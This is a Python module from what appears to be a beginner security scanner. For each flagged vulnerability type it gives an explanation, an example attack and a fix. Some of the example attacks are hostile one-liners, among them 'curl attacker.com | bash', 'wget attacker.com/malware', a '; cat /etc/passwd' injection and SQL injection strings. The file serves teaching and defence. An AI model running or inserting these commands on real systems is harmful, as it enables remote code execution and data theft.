"""
scanner/explanations.py
------------------------
"Why This Is Dangerous" Engine (Day 5 Enhanced)

For every detected vulnerability, this module provides a beginner-friendly
explanation of WHY the issue is dangerous and HOW an attacker would exploit it.
"""

EXPLANATIONS = {
    # --- Code Execution ---
    "Dangerous Execution (eval)": {
        "why_dangerous": "eval() takes a string and runs it as Python code. If an attacker controls that string, they can run ANY command on your server.",
        "real_world_risk": "Classified HIGH because it leads to full Remote Code Execution (RCE). An attacker can read files, delete data, or install backdoors.",
        "attack_possibility": "Attacker sends: eval(\"__import__('os').system('curl attacker.com | bash')\") and your server executes it silently.",
        "secure_coding": "Never pass user input to eval(). Use a safe parser like ast.literal_eval() or simpleeval library instead.",
    },
    "Dangerous Execution (exec)": {
        "why_dangerous": "exec() executes dynamically created Python code. Like eval(), if user input reaches exec(), the attacker controls your server.",
        "real_world_risk": "HIGH — arbitrary code execution on the server. Complete system compromise is likely.",
        "attack_possibility": "exec(user_script) — attacker crafts a script that exfiltrates your .env file or installs malware.",
        "secure_coding": "Remove exec() from production code. Redesign the logic to avoid dynamic execution entirely.",
    },
    "System Command Execution (os.system)": {
        "why_dangerous": "os.system() passes a string directly to the operating system shell. Attackers can inject extra commands using shell metacharacters.",
        "real_world_risk": "HIGH — direct shell command injection leads to complete server takeover.",
        "attack_possibility": "os.system('ping ' + user_ip) — attacker enters '127.0.0.1; cat /etc/passwd' and receives your password file.",
        "secure_coding": "Use subprocess.run(['ping', user_ip], shell=False) with a sanitised argument list instead of concatenating strings.",
    },
    "Subprocess Execution": {
        "why_dangerous": "Subprocess functions can spawn shell commands. When shell=True is used, or user input is embedded in the command, it becomes a command injection vulnerability.",
        "real_world_risk": "HIGH when combined with shell=True or user input. Can lead to Remote Code Execution.",
        "attack_possibility": "subprocess.Popen(user_cmd, shell=True) — attacker passes 'ls; wget attacker.com/malware'.",
        "secure_coding": "Always use shell=False and pass arguments as a list: subprocess.run(['cmd', 'arg']).",
    },
    "Insecure Deserialization (pickle)": {
        "why_dangerous": "pickle.loads() deserializes Python objects from raw bytes. A crafted pickle payload can embed arbitrary Python code that runs AUTOMATICALLY on load.",
        "real_world_risk": "HIGH — serialization-based RCE, no user interaction needed. Difficult to detect without specialized tools.",
        "attack_possibility": "Attacker sends a malicious pickle payload via an API. Your server calls pickle.loads(data) and the payload executes a reverse shell.",
        "secure_coding": "Never deserialize untrusted data with pickle. Use JSON or a safer format.",
    },
    "Insecure Deserialization (yaml)": {
        "why_dangerous": "yaml.load() without a safe loader can instantiate arbitrary Python objects, similar to pickle.",
        "real_world_risk": "HIGH — can lead to Remote Code Execution.",
        "attack_possibility": "Attacker supplies a YAML payload containing Python object tags that execute code when parsed.",
        "secure_coding": "Always use yaml.safe_load() which only parses basic YAML data types.",
    },
    "Insecure Template Rendering": {
        "why_dangerous": "render_template_string() parses a string as a Jinja2 template. If user input is included, they can execute template expressions.",
        "real_world_risk": "HIGH — Server-Side Template Injection (SSTI) can be escalated to Remote Code Execution.",
        "attack_possibility": "Attacker inputs {{ config.items() }} to dump server configuration and secret keys.",
        "secure_coding": "Use render_template() with separate .html files. Never pass user-controlled variables directly into render_template_string().",
    },
    
    # --- SQL Injection ---
    "SQL Injection (Concatenation)": {
        "why_dangerous": "Building SQL with + concatenation inserts raw user input directly into the query. Attackers can break out of the string and add their own SQL commands.",
        "real_world_risk": "HIGH — database data exfiltration, modification, or complete destruction.",
        "attack_possibility": "Query: \"SELECT * FROM users WHERE name = '\" + name + \"'\" — Attacker enters: ' OR '1'='1 — and gets ALL user records.",
        "secure_coding": "Use parameterised queries (e.g., cursor.execute('SELECT * FROM users WHERE name = ?', (name,))) to separate code from data.",
    },
    "SQL Injection (f-string)": {
        "why_dangerous": "f-strings insert variables directly into SQL text at runtime without sanitisation.",
        "real_world_risk": "HIGH — identical impact to concatenation-based SQL injection.",
        "attack_possibility": "f\"SELECT * FROM users WHERE id = {user_id}\" — attacker passes id=1 OR 1=1-- and dumps the full table.",
        "secure_coding": "Use parameterised queries or an ORM like SQLAlchemy which handles escaping automatically.",
    },
    "SQL Injection (.format)": {
        "why_dangerous": ".format() substitutes values into a template string — directly vulnerable to SQL injection.",
        "real_world_risk": "HIGH — identical impact to concatenation-based SQL injection.",
        "attack_possibility": "'SELECT * FROM users WHERE id = {}'.format(user_id) — classic injection point.",
        "secure_coding": "Replace .format() with parameterised queries (?, %s, or :param syntax).",
    },

    # --- Hardcoded Secrets ---
    "Hardcoded Password": {
        "why_dangerous": "Passwords stored in source code are visible to anyone who reads the file — including teammates, CI logs, or GitHub.",
        "real_world_risk": "MEDIUM — credential exposure leads to direct account or database compromise.",
        "attack_possibility": "Developer pushes code to a public repo. GitHub dorks or secret-scanning bots find password='admin123' within minutes.",
        "secure_coding": "Store passwords in environment variables (os.getenv('DB_PASSWORD')) and use a .env file locally.",
    },
    "Hardcoded API Key": {
        "why_dangerous": "API keys grant access to paid services or sensitive data. Hardcoding them means anyone with code access can use your API budget.",
        "real_world_risk": "MEDIUM-HIGH — financial loss and data breach risk.",
        "attack_possibility": "Leaked AWS API key used to spin up crypto-mining servers — victim receives a $10,000 cloud bill.",
        "secure_coding": "Use environment variables or a secure secrets manager (AWS Secrets Manager, HashiCorp Vault).",
    },
    "Hardcoded Token": {
        "why_dangerous": "Auth tokens are session credentials. A stolen token lets an attacker act as a legitimate user indefinitely.",
        "real_world_risk": "MEDIUM — authentication bypass and impersonation.",
        "attack_possibility": "GitHub token found in code grants full repo write access. Attacker injects malicious code into your projects.",
        "secure_coding": "Rotate the token immediately and load it dynamically from environment variables.",
    },
    "Hardcoded Secret": {
        "why_dangerous": "Secrets like SECRET_KEY are used to sign sessions and tokens. If exposed, attackers can forge valid session cookies.",
        "real_world_risk": "MEDIUM-HIGH — session forgery and complete authentication bypass.",
        "attack_possibility": "Flask SECRET_KEY found in code. Attacker crafts a forged admin session cookie and logs in as administrator.",
        "secure_coding": "Generate a random secret at startup (os.urandom(32)) or load from environment variables.",
    },
}

def get_explanation(issue_name):
    return EXPLANATIONS.get(issue_name, {
        "why_dangerous": "This pattern has been flagged as potentially insecure by the rules engine.",
        "real_world_risk": "Review the code manually to assess the real-world severity and impact.",
        "attack_possibility": "An attacker may be able to exploit this depending on the surrounding context and data flow.",
        "secure_coding": "Follow secure coding guidelines for this language/framework and implement proper validation.",
    })
